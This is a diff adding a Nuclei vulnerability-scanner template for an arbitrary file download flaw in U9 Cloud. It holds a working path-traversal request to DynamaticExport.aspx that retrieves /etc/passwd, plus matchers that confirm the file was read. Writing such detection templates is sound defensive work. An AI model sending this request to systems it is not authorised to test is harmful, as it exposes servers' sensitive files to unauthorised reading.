@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - 'root:x:0:0:'
+        - part: body
+          regex:
+            - .*?:x:\d+:\d+:.*?:/.*?:/.*?
+          type: regex
+      matchers-condition: and
+      raw:
+        - |
+          GET /Portal/Print/DynamaticExport.aspx?filePath=../../etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Nuclei-Security-Scanner
+id: u9cloud-unauth-file-download
+info:
+    author: ProjectDiscoveryAI
+    description: |
+        The U9 Cloud `printDynamaticExport.aspx` endpoint is vulnerable to arbitrary file download, allowing attackers to retrieve sensitive files from the server.
+    name: U9 Cloud Arbitrary File Download
+    severity: critical
+    tags:
+        - u9cloud
+        - file-download
+        - critical
